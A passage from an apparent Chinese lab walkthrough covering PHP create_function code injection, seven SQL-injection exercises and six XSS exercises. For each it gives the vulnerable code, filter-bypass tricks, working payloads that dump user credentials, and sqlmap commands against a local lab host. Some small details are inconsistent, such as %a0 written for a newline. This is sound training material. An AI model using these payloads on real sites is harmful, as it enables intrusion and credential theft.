<td style="text-align:center">正则表达式</td>
</tr>
<tr>
<td>replacement</td>
<td style="text-align:center">替换的内容</td>
</tr>
<tr>
<td>subject</td>
<td style="text-align:center">需要匹配替换的对象</td>
</tr>
<tr>
<td>limit</td>
<td style="text-align:center">可选，指定替换的个数，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换</td>
</tr>
</tbody>
</table>
<h4><span id="特别说明">特别说明</span></h4><p>当Pattern参数使用/e修正符时，preg_replace函数会将replacement参数当作 PHP代码执行，那么，针对此种情况，当replacement内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。</p>
<h3><span id="正则表达式中的模式修正符">正则表达式中的模式修正符</span></h3><p>模式修正符就是字母，只不过这些在模式修正符的应用之中有特殊的含义。下面我来看看都有哪些模式修正符，请看下表： </p>
<table>
<thead>
<tr>
<th>模式修正符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>i</td>
<td style="text-align:center">表示在和模式进行匹配进不区分大小写</td>
</tr>
<tr>
<td>m</td>
<td style="text-align:center">将模式视为多行，使用^和$表示任何一行都可以以正则表达式开始或结束</td>
</tr>
<tr>
<td>s</td>
<td style="text-align:center">如果没有使用这个模式修正符号，元字符中的”.”默认不能表示换行符号,将字符串视为单行</td>
</tr>
<tr>
<td>x</td>
<td style="text-align:center">表示模式中的空白忽略不计</td>
</tr>
<tr>
<td>e</td>
<td style="text-align:center">正则表达式必须使用在preg_replace替换字符串的函数中时才可以使用</td>
</tr>
<tr>
<td>A</td>
<td style="text-align:center">以模式字符串开头，相当于元字符^</td>
</tr>
<tr>
<td>Z</td>
<td style="text-align:center">以模式字符串结尾，相当于元字符$</td>
</tr>
<tr>
<td>U</td>
<td style="text-align:center">正则表达式的特点：就是比较“贪婪”，使用该模式修正符可以取消贪婪模式</td>
</tr>
</tbody>
</table>
<h3><span id="prompt">prompt()</span></h3><p>prompt() 方法用于显示可提示用户进行输入的对话框</p>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prompt(text,defaultText)</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>text</td>
<td style="text-align:center">可选。要在对话框中显示的纯文本（而不是 HTML 格式的文本）。</td>
</tr>
<tr>
<td>defaultText</td>
<td style="text-align:center">可选。默认的输入文本。</td>
</tr>
</tbody>
</table>
<h3><span id="confirm">confirm()</span></h3><p>confirm() 方法用于显示一个带有指定消息和 OK 及取消按钮的对话框。</p>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">confirm(message)</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>message</td>
<td style="text-align:center">要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本）</td>
</tr>
</tbody>
</table>
<h3><span id="fromcharcode">fromCharCode()</span></h3><p>fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串</p>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(numX,numX,...,numX)</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>numX</td>
<td style="text-align:center">必需。一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。</td>
</tr>
</tbody>
</table>
<h3><span id="evalstring">eval(string)</span></h3><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</p>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(string)</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。要计算的字符串，其中含有要计算的 JavaScript 表达式或要执行的语句。</td>
</tr>
</tbody>
</table>
<h3><span id="documentwrite">Document.write()</span></h3><p>write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。<br>可列出多个参数(exp1,exp2,exp3,…) ，它们将按顺序被追加到文档中。</p>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(exp1,exp2,exp3,....)</span><br></pre></td></tr></table></figure>
<h3><span id="locationhash">location.hash</span></h3><p>hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。</p>
<p>假设当前的URL是<a href="http://www.uknowsec/test.htm#PART2：" target="_blank" rel="noopener">http://www.uknowsec/test.htm#PART2：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">document.write(location.hash);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>以上实例输出结果：</p>
<p>#part2</p>
<h3><span id="substring">substring()</span></h3><p>substring() 方法用于提取字符串中介于两个指定下标之间的字符。</p>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stringObject.substring(start,stop)</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>start</td>
<td style="text-align:center">必需。一个非负的整数，规定要提取的子串的第一个字符在 stringObject 中的位置。</td>
</tr>
<tr>
<td>stop</td>
<td style="text-align:center">可选。一个非负的整数，比要提取的子串的最后一个字符在 stringObject 中的位置多 1。如果省略该参数，那么返回的子串会一直到字符串的结尾。</td>
</tr>
</tbody>
</table>
<h3><span id="strstr">strstr()</span></h3><p>strstr() 函数搜索字符串在另一字符串中的第一次出现。<br>注释：该函数是二进制安全的。<br>注释：该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 stristr() 函数。</p>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr(string,search,before_search)</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定被搜索的字符串。</td>
</tr>
<tr>
<td>search</td>
<td style="text-align:center">必需。规定所搜索的字符串。如果此参数是数字，则搜索匹配此数字对应的 ASCII 值的字符。</td>
</tr>
<tr>
<td>before_search</td>
<td style="text-align:center">可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分。</td>
</tr>
</tbody>
</table>
<h3><span id="addslashes">addslashes()</span></h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes(string)</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
</tbody>
</table>
<h3><span id="create_function代码注入">create_function()代码注入</span></h3><h4><span id="测试环境版本">测试环境版本：</span></h4><p>apache +php 5.2、apache +php 5.3</p>
<h4><span id="有问题的代码">有问题的代码：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//02-8.php?id=2;&#125;phpinfo();/*</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$str2=&apos;echo  &apos;.$a.&apos;test&apos;.$id.&quot;;&quot;;</span><br><span class="line">echo $str2;</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;==============================&quot;;</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">$f1 = create_function(&apos;$a&apos;,$str2);</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;==============================&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="利用方法">利用方法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/libtest/02-8.php?id=2;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure>
<h4><span id="实现原理">实现原理：</span></h4><p>由于id=2;}phpinfo();/*<br>执行函数为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">源代码：</span><br><span class="line">function fT($a) &#123;</span><br><span class="line">  echo &quot;test&quot;.$a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注入后代码：</span><br><span class="line">function fT($a) &#123;</span><br><span class="line">  echo &quot;test&quot;;&#125;</span><br><span class="line">  phpinfo();/*;//此处为注入代码。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="trim">trim()</span></h3><p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
<h4><span id="相关函数">相关函数：</span></h4><p>ltrim() - 移除字符串左侧的空白字符或其他预定义字符<br>rtrim() - 移除字符串右侧的空白字符或其他预定义字符</p>
<h4><span id="语法">语法</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trim(string,charlist)</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要检查的字符串。</td>
</tr>
<tr>
<td>charlist</td>
<td style="text-align:center">可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符： “\0” - NULL “\t” - 制表符 “\n” - 换行 “\x0B” - 垂直制表符 “\r” - 回车 “ “ - 空格</td>
</tr>
</tbody>
</table>
<h3><span id="htmlentities">htmlentities()</span></h3><p>htmlentities() 函数把字符转换为 HTML 实体。</p>
<h4><span id="语法">语法</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlentities(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转换的字符串。</td>
</tr>
<tr>
<td>flags</td>
<td style="text-align:center">可选。规定如何处理引号、无效的编码以及使用哪种文档类型。</td>
</tr>
<tr>
<td>character-set</td>
<td style="text-align:center">可选。一个规定了要使用的字符集的字符串。</td>
</tr>
<tr>
<td>double_encode</td>
<td style="text-align:center">可选。布尔值，规定是否编码已存在的 HTML 实体。 TRUE - 默认。将对每个实体进行转换。FALSE - 不会对已存在的 HTML 实体进行编码。</td>
</tr>
</tbody>
</table>
<h3><span id="header">header()</span></h3><p>header() 函数向客户端发送原始的 HTTP 报头。</p>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(string,replace,http_response_code)</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要发送的报头字符串。</td>
</tr>
<tr>
<td>replace</td>
<td style="text-align:center">可选。指示该报头是否替换之前的报头，或添加第二个报头。默认是 true（替换）。false（允许相同类型的多个报头）。</td>
</tr>
<tr>
<td>http_response_code</td>
<td style="text-align:center">可选。把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）</td>
</tr>
</tbody>
</table>
<h2><span id="sql-injections">SQL injections</span></h2><h3><span id="example-1">Example 1</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;; $result = mysql_query($sql); if ($result) &#123; ?&gt;</span><br></pre></td></tr></table></figure>
<p>字符类型的注入，无过滤<br>用来练习手注是个不错的题目</p>
<h4><span id="判断注入点">判断注入点</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; 页面返回异常</span><br><span class="line"></span><br><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; and 1=1%23 页面返回正常</span><br><span class="line"></span><br><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; and 1=2%23 页面返回正常</span><br></pre></td></tr></table></figure>
<h4><span id="判断字段长">判断字段长</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; order by 5%23 页面返回正常</span><br><span class="line"></span><br><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; order by 6%23 页面返回异常</span><br></pre></td></tr></table></figure>
<p>推断出这个表中有5个字段</p>
<h4><span id="猜解当前数据库名">猜解当前数据库名；</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,database(),3,4,5%23</span><br></pre></td></tr></table></figure>
<h4><span id="猜解所有的数据库">猜解所有的数据库</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,SCHEMA_NAME,3,4,5 from information_schema.SCHEMATA%23</span><br></pre></td></tr></table></figure>
<h4><span id="猜解所有的表名">猜解所有的表名</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,table_name,3,4,5 from information_schema.tables%23</span><br></pre></td></tr></table></figure>
<h4><span id="猜解当前数据库exercises的所以表名">猜解当前数据库（exercises）的所以表名</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,table_name,3,4,5 from information_schema.tables where table_schema= database()%23</span><br></pre></td></tr></table></figure>
<h4><span id="猜解当前数据库的user的字段名">猜解当前数据库的user的字段名</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,COLUMN_NAME,2,4,5 from information_schema.COLUMNS where table_name = &apos;users&apos;%23</span><br></pre></td></tr></table></figure>
<h4><span id="判断版本号">判断版本号</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,version(),2,4,5%23</span><br></pre></td></tr></table></figure>
<h4><span id="判断用户名">判断用户名</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,user(),2,4,5%23  </span><br><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,current_user(),2,4,5%23</span><br><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,system_user(),2,4,5%23</span><br><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,session_user(),2,4,5%23</span><br></pre></td></tr></table></figure>
<h4><span id="读取值">读取值</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,name,passwd,4,5 from users%23</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.105/sqli/example1.php?name=root --dbs</span><br></pre></td></tr></table></figure>
<h3><span id="example-2">Example 2</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;/ /&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;ERROR NO SPACE&quot;); &#125; $sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;; $result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<p>与example1差不多，过滤了空格，语句中存现空格就会报错</p>
<p>mysql注入绕过空格过滤的方法：</p>
<p>1、水平制表(HT) url编码：%09</p>
<p>2、注释绕过空格   /<em>注释</em>/</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;%09union%09select%091,name,passwd,4,5%09from%09users%23  %09替换空格绕过</span><br><span class="line"></span><br><span class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;/**/union/**/select/**/1,name,passwd,4,5/**/from/**/users%23  /**/替换空格绕过</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span></h4><p>调用space2comment.py<br>用“/**/”替换空格符绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.105/sqli/example3.php?name=root --dbs --tamper=space2comment.py</span><br></pre></td></tr></table></figure></p>
<h3><span id="example-3">Example 3</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;/\s+/&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;ERROR NO SPACE&quot;); &#125; $sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;;</span><br></pre></td></tr></table></figure>
<p>在example2的基础上，\s匹配任何空白字符,包括空格、制表符、换页符等，全部过滤掉<br>可以使用example2中 /<em>注释</em>/ 绕过过滤</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;/**/union/**/select/**/1,name,passwd,4,5/**/from/**/users%23</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span></h4><p>调用space2comment.py<br>用“/**/”替换空格符绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.105/sqli/example3.php?name=root --dbs --tamper=space2comment.py</span><br></pre></td></tr></table></figure>
<h3><span id="example-4">Example 4</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users where id=&quot;; $sql.=mysql_real_escape_string($_GET[&quot;id&quot;]).&quot; &quot;; $result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<p>数值型的注入，过滤了单引号等，对数值型无效</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example4.php?id=2 or 1=1</span><br><span class="line">http://192.168.1.105/sqli/example4.php?id=2 union select 1,name, passwd,4,5 from users</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.105/sqli/example4.php?id=2 --dbs</span><br></pre></td></tr></table></figure>
<h3><span id="example-5">Example 5</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&apos;/^[0-9]+/&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</span><br></pre></td></tr></table></figure>
<p>与前面类似，以一个数字开头的，后面可添加构造的sql语句进行攻击测试</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example4.php?id=2 or 1=1</span><br><span class="line">http://192.168.1.105/sqli/example4.php?id=2 union select 1,name, passwd,4,5 from users</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.105/sqli/example5.php?id=2 --dbs</span><br></pre></td></tr></table></figure>
<h3><span id="example-6">Example 6</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&apos;/[0-9]+$/&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</span><br></pre></td></tr></table></figure>
<p>正则表达式值确保了参数id是以一个数字结尾的.他不能确保id参数的开头是合法的.</p>
<p>你可以变通一下前面说到的检测方法.你只需要在你的payload后面加上数字.比如你可以这样:1 or 1=1 # 123</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.105/sqli/example6.php?id=2 or 1=1-- - 1</span><br><span class="line">http://192.168.1.105/sqli/example6.php?id=2 or 1=1# 1</span><br><span class="line">http://192.168.1.105/sqli/example6.php?id=2 union select 1,name,passwd,4,5 from users-- - 123</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.105/sqli/example6.php?id=2 --dbs</span><br></pre></td></tr></table></figure>
<h3><span id="example-7">Example 7</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&apos;/^-?[0-9]+$/m&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</span><br></pre></td></tr></table></figure>
<p>正则表达式将检查开始和结束的字符串是一个数字。然而，正则表达式中有一个修饰符/m。它只检查一行，不关心下一行有开始还是结束用数字。所以我们可以绕过它采用id =2\npayload。我们需要把\n转换成十六进制。就是%a0</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.110/sqli/example7.php?id=2%0aunion%0aselect%0a1,name,passwd,4,5%0afrom%0ausers%23</span><br></pre></td></tr></table></figure>
<h4><span id="sqlmap">SQLMAP</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.1.110/sqli/example7.php?id=2%0a</span><br></pre></td></tr></table></figure>
<h2><span id="xss">XSS</span></h2><h3><span id="example-1">Example 1</span></h3><p>没有做任何过滤</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="example-2">Example 2</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;,$name);</span><br><span class="line">preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;,$name);</span><br></pre></td></tr></table></figure>
<p>过滤script标签，利用大写绕过</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="example-3">Example 3</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;,$name);</span><br><span class="line">preg_replace(&quot;/&lt;\/script&gt;/i&quot;,&quot;&quot;,$name);</span><br></pre></td></tr></table></figure>
<p>过滤script标签，且使用模式修正符i，忽略大小写。</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="example-4">Example 4</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&apos;/script/i&apos;,$_GET[&quot;name&quot;])</span><br></pre></td></tr></table></figure>
<p>过滤script字符，且使用模式修正符i,忽略大小写。<br>利用img标签</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="example-5">Example 5</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&apos;/alert/i&apos;,$_GET[&quot;name&quot;]))</span><br></pre></td></tr></table></figure>
<p>过滤alert字符，且使用模式修正符i,忽略大小写<br>利用prompt(),confirm(),String.fromCharCode()函数实现弹框</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;prompt(1);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(1);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="example-6">Example 6</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var $a=&quot;&lt;?php echo $_GET[&quot;name&quot;];?&gt;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>有源码可以看出，GET方式得到的参数直接发送到javascript代码中，所以在发送Payload的时候不需要添加script标签，只需要发送需要只执行的javascript代码即可。</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert(1);//</span><br></pre></td></tr></table></figure>
